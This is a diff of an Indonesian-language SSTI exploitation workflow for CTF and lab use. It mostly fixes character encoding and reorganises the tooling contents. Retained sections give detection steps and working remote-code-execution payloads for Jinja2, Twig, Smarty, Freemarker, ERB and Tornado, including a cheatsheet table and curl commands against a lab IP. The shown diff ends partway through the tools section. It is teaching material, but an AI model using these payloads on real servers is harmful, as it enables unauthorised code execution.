@@ -1,6 +1,6 @@
 ---
 id: "23"
-title: "Workflow 23 â€” Server-Side Template Injection (SSTI)"
+title: "Workflow 23 — Server-Side Template Injection (SSTI)"
 category: "3. Web Exploitation"
 categoryId: "web"
 filename: "23_ssti_workflow.md"
@@ -8,20 +8,20 @@ refs_out: ["06","14a","14b","22","28","44","64"]
 refs_in: ["04","15","22","24","27","30"]
 ---
 
-â† [File 22: SSRF](/docs/ssrf)
+→ [File 22: SSRF](/docs/ssrf)
 
 ---
 
-# Workflow 23 â€” Server-Side Template Injection (SSTI)
+# Workflow 23 — Server-Side Template Injection (SSTI)
 
 > **Scope:** HackTheBox, TryHackMe, PortSwigger, CTF, dan lab yang memang mengizinkan eksploitasi.  
-> **Target mindset:** dari input â†’ deteksi SSTI â†’ identifikasi template engine â†’ validasi impact â†’ information disclosure â†’ RCE/sandbox escape â†’ bypass filter â†’ otomasi.
+> **Target mindset:** dari input → deteksi SSTI → identifikasi template engine → validasi impact → information disclosure → RCE/sandbox escape → bypass filter → otomasi.
 
 ---
 
 # Daftar Isi
 
-- [Bagian 0 â€” SSTI Fundamentals](#bagian-0--ssti-fundamentals)
+- [Bagian 0 — SSTI Fundamentals](#bagian-0--ssti-fundamentals)
     
     - [0.1 Apa Itu Template Engine](#01-apa-itu-template-engine)
         
@@ -31,7 +31,7 @@ refs_in: ["04","15","22","24","27","30"]
         
     - [0.4 SSTI Detection Payload](#04-ssti-detection-payload)
         
-- [Bagian 1 â€” Template Engine Identification](#bagian-1--template-engine-identification)
+- [Bagian 1 — Template Engine Identification](#bagian-1--template-engine-identification)
     
     - [1.1 Universal Detection Flow](#11-universal-detection-flow)
         
@@ -41,7 +41,7 @@ refs_in: ["04","15","22","24","27","30"]
         
     - [1.4 Blind Identification](#14-blind-identification)
         
-- [Bagian 2 â€” Jinja2](#bagian-2--jinja2-pythonflask)
+- [Bagian 2 — Jinja2](#bagian-2--jinja2-pythonflask)
     
     - [2.1 Jinja2 Basics](#21-jinja2-basics)
         
@@ -49,11 +49,11 @@ refs_in: ["04","15","22","24","27","30"]
         
     - [2.3 Jinja2 Information Disclosure](#23-jinja2-information-disclosure)
         
-    - [2.4 Jinja2 RCE](#24-jinja2-rce)
+    - [2.4 Jinja2 RCE](#24-jinja2-rce--tahap-demi-tahap)
         
     - [2.5 Jinja2 Filter Bypass](#25-jinja2-filter-bypass)
         
-- [Bagian 3 â€” Twig](#bagian-3--twig-php)
+- [Bagian 3 — Twig](#bagian-3--twig-php)
     
     - [3.1 Twig Basics](#31-twig-basics)
         
@@ -63,13 +63,13 @@ refs_in: ["04","15","22","24","27","30"]
         
     - [3.4 Twig Filter Bypass](#34-twig-filter-bypass)
         
-- [Bagian 4 â€” Smarty](#bagian-4--smarty-php)
+- [Bagian 4 — Smarty](#bagian-4--smarty-php)
     
     - [4.1 Smarty Detection](#41-smarty-detection)
         
     - [4.2 Smarty RCE](#42-smarty-rce)
         
-- [Bagian 5 â€” Freemarker](#bagian-5--freemarker-java)
+- [Bagian 5 — Freemarker](#bagian-5--freemarker-java)
     
     - [5.1 Freemarker Detection](#51-freemarker-detection)
         
@@ -77,45 +77,55 @@ refs_in: ["04","15","22","24","27","30"]
         
     - [5.3 Freemarker Information Disclosure](#53-freemarker-information-disclosure)
         
-- [Bagian 6 â€” Velocity](#bagian-6--velocity-java)
+- [Bagian 6 — Velocity](#bagian-6--velocity-java)
     
     - [6.1 Velocity Detection](#61-velocity-detection)
         
     - [6.2 Velocity RCE](#62-velocity-rce)
         
-- [Bagian 7 â€” Handlebars](#bagian-7--handlebars-nodejs)
+- [Bagian 7 — Handlebars](#bagian-7--handlebars-nodejs)
     
     - [7.1 Handlebars Detection](#71-handlebars-detection)
         
     - [7.2 Handlebars SSTI](#72-handlebars-ssti)
         
-- [Bagian 8 â€” ERB](#bagian-8--erb-ruby)
+- [Bagian 8 — ERB](#bagian-8--erb-ruby)
     
     - [8.1 ERB Detection](#81-erb-detection)
         
     - [8.2 ERB RCE](#82-erb-rce)
         
-- [Bagian 9 â€” Tornado](#bagian-9--tornado-python)
+- [Bagian 9 — Tornado](#bagian-9--tornado-python)
     
     - [9.1 Tornado Detection](#91-tornado-detection)
         
     - [9.2 Tornado RCE](#92-tornado-rce)
         
-- [Bagian 10 â€” SSTI to RCE Cheatsheet](#bagian-10--ssti-to-rce-cheatsheet)
+- [Bagian 10 — SSTI to RCE Cheatsheet](#bagian-10--ssti-to-rce-cheatsheet)
     
-- [Bagian 11 â€” Tools & Automation](#bagian-11--tools--automation)
+- [Bagian 11 — Testing Interfaces & Automation](#bagian-11--testing-interfaces--automation)
     
-    - [11.1 tplmap](#111-tplmap)
+    - [11.1 Request Acquisition](#111-request-acquisition)
         
-    - [11.2 SSTImap](#112-sstimap)
+    - [11.2 Burp Proxy & HTTP History](#112-burp-proxy--http-history)
         
-    - [11.3 Manual Testing dengan curl](#113-manual-testing-dengan-curl)
+    - [11.3 Burp Repeater](#113-burp-repeater)
         
-    - [11.4 Burp Suite untuk SSTI](#114-burp-suite-untuk-ssti)
+    - [11.4 Burp Intruder](#114-burp-intruder)
         
-    - [11.5 ssti_detect.sh](#115-ssti_detectsh)
+    - [11.5 OOB Testing (Collaborator / Interactsh)](#115-oob-testing-collaborator--interactsh)
         
-- [Bagian 12 â€” SSTI Filter Bypass](#bagian-12--ssti-filter-bypass)
+    - [11.6 CLI Reproduction dengan curl](#116-cli-reproduction-dengan-curl)
+        
+    - [11.7 Script `ssti_detect.sh`](#117-script-ssti_detectsh)
+        
+    - [11.8 tplmap](#118-tplmap)
+        
+    - [11.9 SSTImap](#119-sstimap)
+        
+    - [11.10 Tool Decision Guide](#1110-tool-decision-guide)
+        
+- [Bagian 12 — SSTI Filter Bypass](#bagian-12--ssti-filter-bypass)
     
     - [12.1 Encoding Bypass](#121-encoding-bypass)
         
@@ -125,7 +135,7 @@ refs_in: ["04","15","22","24","27","30"]
         
     - [12.4 Blacklist Bypass](#124-blacklist-bypass)
         
-- [Bagian 13 â€” Context Injection](#bagian-13--context-injection)
+- [Bagian 13 — Context Injection](#bagian-13--context-injection)
     
     - [13.1 SSTI dalam HTML Context](#131-ssti-dalam-html-context)
         
@@ -133,20 +143,20 @@ refs_in: ["04","15","22","24","27","30"]
         
     - [13.3 SSTI dalam Header](#133-ssti-dalam-header)
         
-    - [13.4 SSTI dalam File Name/Upload](#134-ssti-dalam-file-name/upload)
+    - [13.4 SSTI dalam File Name/Upload](#134-ssti-dalam-file-nameupload)
         
-- [Bagian 14 â€” Decision Tree](#bagian-14--decision-tree)
+- [Bagian 14 — Decision Tree](#bagian-14--decision-tree)
     
-- [Bagian 15 â€” Common Errors & Troubleshooting](#bagian-15--common-errors--troubleshooting)
+- [Bagian 15 — Common Errors & Troubleshooting](#bagian-15--common-errors--troubleshooting)
     
 
 ---
 
-# Bagian 0 â€” SSTI Fundamentals
+# Bagian 0 — SSTI Fundamentals
 
 ## 0.1 Apa Itu Template Engine
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan pemahaman template engine ketika menemukan input user yang muncul kembali pada halaman dan ada kemungkinan server melakukan **template rendering** sebelum response dikirim.
 
@@ -160,7 +170,7 @@ Template engine adalah sistem yang menggabungkan:
 Template
    +
 Data
-   â†“
+   ↓
 Rendered Response
 ```
 
@@ -251,9 +261,9 @@ Server dapat memperlakukannya sebagai:
 
 ```text
 expression
-   â†“
+   ↓
 7 * 7
-   â†“
+   ↓
 49
 ```
 
@@ -369,15 +379,15 @@ Perbedaan penting:
 
 ```text
 XSS
-â””â”€â”€ Browser execution
+└── Browser execution
 
 SSTI
-â””â”€â”€ Server template execution
-    â””â”€â”€ potentially
-        â”œâ”€â”€ Data disclosure
-        â”œâ”€â”€ File read
-        â”œâ”€â”€ Secret extraction
-        â””â”€â”€ RCE
+└── Server template execution
+    └── potentially
+        ├── Data disclosure
+        ├── File read
+        ├── Secret extraction
+        └── RCE
 ```
 
 Jangan membuat asumsi:
@@ -398,7 +408,7 @@ Template expression dievaluasi
 
 # 0.2 Kenapa SSTI Berbahaya
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan analisis impact ketika SSTI sudah terkonfirmasi dan kamu perlu menentukan apakah bug hanya expression evaluation atau dapat berkembang menjadi server-side code execution.
 
@@ -410,13 +420,13 @@ Beberapa engine mengekspos object atau class yang memungkinkan attacker mencapai
 
 ```text
 Template
-   â†“
+   ↓
 Object
-   â†“
+   ↓
 Class
-   â†“
+   ↓
 Runtime
-   â†“
+   ↓
 OS Command
 ```
 
@@ -506,7 +516,7 @@ Sandbox implementation
 
 # 0.3 Cara Identify SSTI
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan tahap ini segera setelah menemukan parameter yang direfleksikan atau diproses server.
 
@@ -633,16 +643,16 @@ TemplateSyntaxError
 Interpretasi:
 
 ```text
-A â†’ probably not interpreted
-B â†’ expression evaluated
-C â†’ parser likely recognized syntax
+A → probably not interpreted
+B → expression evaluated
+C → parser likely recognized syntax
 ```
 
 ---
 
 # 0.4 SSTI Detection Payload
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan detection payload sebagai **fingerprinting**, bukan langsung sebagai RCE. Mulai dari payload matematika paling sederhana.
 
@@ -663,11 +673,11 @@ Gunakan detection payload sebagai **fingerprinting**, bukan langsung sebagai RCE
 
 ---
 
-# Bagian 1 â€” Template Engine Identification
+# Bagian 1 — Template Engine Identification
 
 # 1.1 Universal Detection Flow
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan flow ini setiap kali SSTI dicurigai tetapi engine belum diketahui.
 
@@ -835,7 +845,7 @@ Handlebars
 
 # 1.2 Payload Matrix per Engine
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan tabel ini setelah detection awal untuk memilih payload konfirmasi yang paling membedakan.
 
@@ -862,7 +872,7 @@ Jangan menyimpulkan:
 
 ```text
 {{7*7}} = 49
-â†’ pasti Jinja2
+→ pasti Jinja2
 ```
 
 Itu false positive yang sangat umum.
@@ -889,7 +899,7 @@ CONFIRMED ENGINE
 
 # 1.3 Error-Based Identification
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan saat payload dievaluasi sebagian, menghasilkan error, atau server mengembalikan stack trace.
 
@@ -1030,7 +1040,7 @@ jauh lebih kuat daripada sekadar:
 
 # 1.4 Blind Identification
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika hasil expression tidak terlihat dalam response.
 
@@ -1038,9 +1048,9 @@ Contoh:
 
 ```text
 Input diterima
-â†“
+↓
 server memproses
-â†“
+↓
 output tidak ditampilkan
 ```
 
@@ -1078,17 +1088,17 @@ Tujuan:
 
 ```text
 baseline
-â†“
+↓
 expression
-â†“
+↓
 bandingkan latency
 ```
 
 Contoh konsep:
 
 ```text
-Request A â†’ normal
-Request B â†’ expression with controlled delay
+Request A → normal
+Request B → expression with controlled delay
 ```
 
 Jangan langsung menggunakan delay besar pada target publik.
@@ -1130,11 +1140,11 @@ Webhook/callback server
 
 ---
 
-# Bagian 2 â€” Jinja2 (Python/Flask)
+# Bagian 2 — Jinja2 (Python/Flask)
 
 # 2.1 Jinja2 Basics
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan bagian ini ketika target menggunakan Flask atau Python dan detection mengarah ke Jinja2.
 
@@ -1220,7 +1230,7 @@ Keberadaan object bergantung pada context aplikasi.
 
 # 2.2 Jinja2 Detection
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan sebagai validasi awal sebelum mencoba access object atau RCE.
 
@@ -1260,7 +1270,7 @@ Perbandingan:
 Jinja2:
 
 7 * "7"
-â†“
+↓
 "7777777"
 ```
 
@@ -1329,7 +1339,7 @@ Response:
 
 # 2.3 Jinja2 Information Disclosure
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan setelah SSTI terkonfirmasi tetapi sebelum RCE. Tujuannya memahami context yang tersedia.
 
@@ -1441,9 +1451,9 @@ selalu ada atau bisa digunakan untuk authentication bypass.
 
 ---
 
-# 2.4 Jinja2 RCE â€” Tahap demi Tahap
+# 2.4 Jinja2 RCE — Tahap demi Tahap
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan hanya pada CTF/lab yang memang mengizinkan code execution. Tujuan tahapan ini adalah memahami **jalur object traversal**, bukan menghafalkan satu payload.
 
@@ -1481,7 +1491,7 @@ Command execution
 
 ---
 
-## Step 1 â€” Access MRO
+## Step 1 — Access MRO
 
 Python object:
 
@@ -1511,13 +1521,13 @@ Ini menunjukkan:
 
 ```text
 str
- â†“
+ ↓
 object
 ```
 
 ---
 
-## Step 1A â€” Via `__bases__`
+## Step 1A — Via `__bases__`
 
 Alternatif:
 
@@ -1549,7 +1559,7 @@ menunjukkan direct parent classes.
 
 ---
 
-## Step 2 â€” Find `__subclasses__`
+## Step 2 — Find `__subclasses__`
 
 Setelah mencapai:
 
@@ -1584,7 +1594,7 @@ Pada environment yang permisif, output dapat sangat panjang:
 
 ---
 
-## Step 3 â€” Mencari Class yang Relevan
+## Step 3 — Mencari Class yang Relevan
 
 Konsep penting:
 
@@ -1621,7 +1631,7 @@ Jangan:
 
 ```text
 subclasses index = X
-â†’ selalu sama
+→ selalu sama
 ```
 
 Tetapi:
@@ -1650,7 +1660,7 @@ subprocess
 
 ---
 
-## Step 4 â€” Execution Primitive
+## Step 4 — Execution Primitive
 
 Class yang sering menarik dalam CTF adalah:
 
@@ -1705,7 +1715,7 @@ b'uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ---
 
-## Variant A â€” Standard
+## Variant A — Standard
 
 ```jinja2
 {{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}
@@ -1720,7 +1730,7 @@ b'uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 ---
 
-## Variant B â€” `__bases__`
+## Variant B — `__bases__`
 
 ```jinja2
 {{''.__class__.__bases__[0].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}
@@ -1730,17 +1740,17 @@ Concept:
 
 ```text
 str
- â†“
+ ↓
 __bases__
- â†“
+ ↓
 object
- â†“
+ ↓
 __subclasses__
 ```
 
 ---
 
-## Variant C â€” Accessing via a Different Object
+## Variant C — Accessing via a Different Object
 
 Kadang object yang digunakan bukan string.
 
@@ -1764,9 +1774,9 @@ find Python class hierarchy
 
 ---
 
-## Variant D â€” Jinja2 Built-in Globals (SANGAT DIREKOMENDASIKAN)
+## Variant D — Jinja2 Built-in Globals (SANGAT DIREKOMENDASIKAN)
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 **Gunakan ini SEBELUM mencoba subclasses chain** karena tidak butuh index lookup. Tersedia di Flask/Jinja2 secara default dan **sangat sering muncul di CTF HackTheBox**.
 
@@ -1774,17 +1784,17 @@ find Python class hierarchy
 
 Jinja2 memiliki built-in globals yang selalu tersedia dalam Flask context:
 
-- `cycler` â€” untuk iterasi template
-- `joiner` â€” untuk join string  
-- `namespace` â€” untuk namespace object
+- `cycler` — untuk iterasi template
+- `joiner` — untuk join string
+- `namespace` — untuk namespace object
 
 Semua objek ini bisa digunakan sebagai entry point ke `__globals__` yang berisi module `os`.
 
 ### Keuntungan vs Subclasses Chain
 
-âœ… **Tidak perlu mencari index** yang berubah per environment  
-âœ… **Langsung ke os module** tanpa traversal panjang  
-âœ… **Lebih reliable** di CTF karena tidak bergantung pada class index  
+✅ **Tidak perlu mencari index** yang berubah per environment  
+✅ **Langsung ke os module** tanpa traversal panjang  
+✅ **Lebih reliable** di CTF karena tidak bergantung pada class index
 
 ### Payload
 
@@ -1820,7 +1830,7 @@ curl -sG 'http://10.10.10.10/search' \
 
 ---
 
-## curl â€” Standard
+## curl — Standard
 
 ```bash
 curl -sG 'http://10.10.10.10/search' \
@@ -1829,7 +1839,7 @@ curl -sG 'http://10.10.10.10/search' \
 
 ---
 
-## curl â€” `__bases__`
+## curl — `__bases__`
 
 ```bash
 curl -sG 'http://10.10.10.10/search' \
@@ -1838,7 +1848,7 @@ curl -sG 'http://10.10.10.10/search' \
 
 ---
 
-## curl â€” `cycler`
+## curl — `cycler`
 
 ```bash
 curl -sG 'http://10.10.10.10/search' \
@@ -1859,11 +1869,11 @@ Setelah itu:
 
 ```text
 id
-â†“
+↓
 whoami
-â†“
+↓
 pwd
-â†“
+↓
 hostname
 ```
 
@@ -1873,7 +1883,7 @@ gunakan hanya command read-only terlebih dahulu.
 
 # 2.5 Jinja2 Filter Bypass
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika SSTI sudah terbukti tetapi karakter seperti:
 
@@ -1946,7 +1956,7 @@ Pendekatan umum:
 
 ```text
 hindari literal keyword
-â†“
+↓
 bangun string secara dinamis
 ```
 
@@ -1960,7 +1970,7 @@ Namun penting:
 
 ```text
 menghasilkan string
-â‰ 
+≠
 otomatis mengakses attribute
 ```
 
@@ -2016,11 +2026,11 @@ Apakah hanya string matching?
 
 ---
 
-# Bagian 3 â€” Twig (PHP)
+# Bagian 3 — Twig (PHP)
 
 # 3.1 Twig Basics
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika PHP application menggunakan Twig atau error menunjukkan namespace Twig.
 
@@ -2071,7 +2081,7 @@ tidak cukup untuk membuktikan salah satunya.
 
 # 3.2 Twig Detection
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan untuk membedakan Twig dari Jinja2.
 
@@ -2123,7 +2133,7 @@ curl -sG 'http://10.10.10.10/search' \
 
 # 3.3 Twig RCE
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan hanya pada challenge/lab lama atau konfigurasi Twig yang memang mengekspos mekanisme tersebut. Banyak payload klasik Twig tidak bekerja pada versi/config modern.
 
@@ -2142,15 +2152,15 @@ Konsep:
 
 ```text
 _self
-  â†“
+  ↓
 environment
-  â†“
+  ↓
 registerUndefinedFilterCallback
-  â†“
+  ↓
 exec
-  â†“
+  ↓
 getFilter("id")
-  â†“
+  ↓
 command execution
 ```
 
@@ -2190,7 +2200,7 @@ Application menggunakan custom environment
 
 # 3.4 Twig Filter Bypass
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika Twig teridentifikasi tetapi primitive klasik tidak tersedia.
 
@@ -2200,13 +2210,13 @@ Investigasi:
 
 ```text
 _self
- â†“
+ ↓
 environment
- â†“
+ ↓
 available filters
- â†“
+ ↓
 available functions
- â†“
+ ↓
 sandbox
 ```
 
@@ -2229,11 +2239,11 @@ shell_exec
 
 ---
 
-# Bagian 4 â€” Smarty (PHP)
+# Bagian 4 — Smarty (PHP)
 
 # 4.1 Smarty Detection
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika syntax Jinja/Twig tidak bekerja tetapi expression dengan single braces dievaluasi.
 
@@ -2275,7 +2285,7 @@ Smarty_Internal_Template
 
 # 4.2 Smarty RCE
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan hanya pada CTF/lab dengan Smarty configuration yang mengizinkan PHP/system functionality.
 
@@ -2323,11 +2333,11 @@ Jangan menganggap payload lama universal.
 
 ---
 
-# Bagian 5 â€” Freemarker (Java)
+# Bagian 5 — Freemarker (Java)
 
 # 5.1 Freemarker Detection
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika target Java menggunakan FreeMarker atau `${...}` menghasilkan evaluation.
 
@@ -2367,7 +2377,7 @@ freemarker.core.InvalidReferenceException
 
 # 5.2 Freemarker RCE
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan pada challenge yang memberikan FreeMarker execution dan memungkinkan Java utility classes.
 
@@ -2446,7 +2456,7 @@ Modern hardening
 
 # 5.3 Freemarker Information Disclosure
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika ingin mengetahui data model yang tersedia sebelum melakukan exploitation lebih jauh.
 
@@ -2482,11 +2492,11 @@ curl -sG 'http://10.10.10.10/search' \
 
 ---
 
-# Bagian 6 â€” Velocity (Java)
+# Bagian 6 — Velocity (Java)
 
 # 6.1 Velocity Detection
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika Java target tidak cocok dengan Freemarker tetapi syntax `#set`, `$variable`, atau package Velocity muncul.
 
@@ -2528,7 +2538,7 @@ Expected:
 
 # 6.2 Velocity RCE
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan pada Velocity CTF/lab ketika class instantiation atau reflection primitive tersedia.
 
@@ -2583,11 +2593,11 @@ exec("id")
 
 ---
 
-# Bagian 7 â€” Handlebars (Node.js)
+# Bagian 7 — Handlebars (Node.js)
 
 # 7.1 Handlebars Detection
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika Node.js terlihat tetapi:
 
@@ -2649,7 +2659,7 @@ Tetapi ini adalah isu escaping, bukan otomatis SSTI.
 
 # 7.2 Handlebars SSTI
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika aplikasi benar-benar mengompilasi atau menyusun template berdasarkan input user dan prototype-related primitives masih dapat dicapai.
 
@@ -2684,11 +2694,11 @@ Konsep:
 
 ```text
 object
- â†“
+ ↓
 constructor
- â†“
+ ↓
 constructor
- â†“
+ ↓
 Function
 ```
 
@@ -2733,7 +2743,7 @@ Ini justru menjadi fingerprint yang berguna.
 {{7*7}}
 ```
 
-â†’ literal
+→ literal
 
 bukan berarti:
 
@@ -2755,11 +2765,11 @@ package/version
 
 ---
 
-# Bagian 8 â€” ERB (Ruby)
+# Bagian 8 — ERB (Ruby)
 
 # 8.1 ERB Detection
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika target memakai Ruby/Rails atau syntax `<%= %>` teridentifikasi.
 
@@ -2809,7 +2819,7 @@ atau Rails stack trace.
 
 # 8.2 ERB RCE
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan hanya pada CTF/lab. ERB secara desain dapat mengevaluasi Ruby sehingga SSTI dapat sangat dekat dengan RCE.
 
@@ -2879,11 +2889,11 @@ curl -sG 'http://10.10.10.10/search' \
 
 ---
 
-# Bagian 9 â€” Tornado (Python)
+# Bagian 9 — Tornado (Python)
 
 # 9.1 Tornado Detection
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan ketika target merupakan Python application yang memakai Tornado templates.
 
@@ -2928,13 +2938,13 @@ atau stack trace Python yang mengarah ke Tornado.
 
 # 9.2 Tornado RCE
 
-### ðŸ“Œ Kapan Digunakan
+### 📌 Kapan Digunakan
 
 Gunakan pada Tornado template lab ketika template directives dapat mengakses import/module functionality.
 
 ### Payload yang Lebih Reliable
 
-**âš ï¸ PENTING:** Tornado **TIDAK** menggunakan syntax `{% import os %}` seperti Jinja2. Tornado mendukung Python expressions langsung dalam `{{ }}`.
+**⚠️ PENTING:** Tornado **TIDAK** menggunakan syntax `{% import os %}` seperti Jinja2. Tornado mendukung Python expressions langsung dalam `{{ }}`.
 
 Payload yang **benar** dan **reliable** di Tornado CTF:
 
@@ -2956,7 +2966,7 @@ uid=1000(app) gid=1000(app) groups=1000(app)
 
 ---
 
-## curl â€” Recommended
+## curl — Recommended
 
 ```bash
 # Payload 1: via os.popen (RECOMMENDED)
@@ -2983,49 +2993,49 @@ sedangkan command output mungkin tercetak di server stdout, bukan selalu ke HTTP
 Untuk CTF, ini penting:
 
 ```text
-RCE â‰  stdout visible
+RCE ≠ stdout visible
 ```
 
 **Gunakan `popen().read()` atau `check_output()` untuk mendapat output di response.**
 
 ---
 
-# Bagian 9.3 â€” Pebble Engine (Java) â€” Not Covered
+# Bagian 9.3 — Pebble Engine (Java) — Not Covered
 
-### âš ï¸ Catatan Penting
+### ⚠️ Catatan Penting
 
 **Pebble** adalah template engine untuk Java yang jarang muncul di CTF environment. File ini **tidak membahas Pebble secara detail** karena:
 
 1. **Jarang digunakan** di HackTheBox, TryHackMe, dan PortSwigger labs
 2. **Java SSTI** lebih sering menggunakan Freemarker atau Velocity
-3. **Detection** Pebble mirip dengan Jinja2/Twig (`{{7*7}}` â†’ `49`), sehingga sering tertukar
+3. **Detection** Pebble mirip dengan Jinja2/Twig (`{{7*7}}` → `49`), sehingga sering tertukar
 
 ### Jika Menemukan Pebble
 
 Jika kamu yakin target menggunakan Pebble (dari error message atau framework detection), referensi:
 
 - [Pebble Official Docs](https://pebbletemplates.io/)
-- [PayloadsAllTheThings â€” Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pebble)
+- [PayloadsAllTheThings — Template Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#pebble)
 
 Untuk CTF, **prioritaskan Jinja2, Twig, Freemarker, dan Velocity** terlebih dahulu.
 
 ---
 
-# Bagian 10 â€” SSTI to RCE Cheatsheet
+# Bagian 10 — SSTI to RCE Cheatsheet
 
 > **MASTER QUICK REFERENCE**
 
 |Engine|Detection|RCE Payload|Notes|
 |---|---|---|---|
-|**Jinja2**|`{{7*7}}` â†’ `49`|`{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}`|Index berbeda per environment|
-|**Jinja2**|`{{7*'7'}}` â†’ `7777777`|`{{cycler.__init__.__globals__.os.popen('id').read()}}`|Context/version dependent|
-|**Twig**|`{{7*7}}` â†’ `49`|`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`|Classic technique; modern Twig may block it|
-|**Smarty**|`{7*7}` â†’ `49`|`{system("id")}`|Configuration/version dependent|
-|**Freemarker**|`${7*7}` â†’ `49`|`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`|Security policy may block|
-|**Velocity**|`#set($x=7*7)$x` â†’ `49`|Reflection/runtime technique|Highly configuration dependent|
+|**Jinja2**|`{{7*7}}` → `49`|`{{''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate()[0]}}`|Index berbeda per environment|
+|**Jinja2**|`{{7*'7'}}` → `7777777`|`{{cycler.__init__.__globals__.os.popen('id').read()}}`|Context/version dependent|
+|**Twig**|`{{7*7}}` → `49`|`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`|Classic technique; modern Twig may block it|
+|**Smarty**|`{7*7}` → `49`|`{system("id")}`|Configuration/version dependent|
+|**Freemarker**|`${7*7}` → `49`|`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`|Security policy may block|
+|**Velocity**|`#set($x=7*7)$x` → `49`|Reflection/runtime technique|Highly configuration dependent|
 |**Handlebars**|`{{7*7}}` usually literal|Prototype/constructor chain|Strongly version/configuration dependent|
-|**ERB**|`<%=7*7%>` â†’ `49`|`<%= \`id` %>`|Ruby code execution|
-|**Tornado**|`{{7*7}}` â†’ `49`|`{% import os %}{{os.system("id")}}`|Command output may not appear in HTTP|
+|**ERB**|`<%=7*7%>` → `49`|`<%= \`id `%>`|Ruby code execution|
+|**Tornado**|`{{7*7}}` → `49`|`{% import os %}{{os.system("id")}}`|Command output may not appear in HTTP|
 
 ---
 
@@ -3033,171 +3043,338 @@ Untuk CTF, **prioritaskan Jinja2, Twig, Freemarker, dan Velocity** terlebih dahu
 
 ```text
 Jinja2
-â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  Very common in CTF
+████████████████████  Very common in CTF
 
 Twig
-â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ       Common
+██████████████       Common
 
 Freemarker
-â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ         Common in Java labs
+████████████         Common in Java labs
 
 ERB
-â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ           Common in Ruby labs
+██████████           Common in Ruby labs
 
 Smarty
-â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ             PHP legacy/common labs
+████████             PHP legacy/common labs
 
 Velocity
-â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ               Java legacy labs
+██████               Java legacy labs
 
 Tornado
-â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ                Python-specific
+█████                Python-specific
 
 Handlebars
-â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ                Node-specific
+█████                Node-specific
 ```
 
 ---
 
-# Bagian 11 â€” Tools & Automation
+# Bagian 11 — Testing Interfaces & Automation
 
-# 11.1 tplmap
-
-### ðŸ“Œ Kapan Digunakan
-
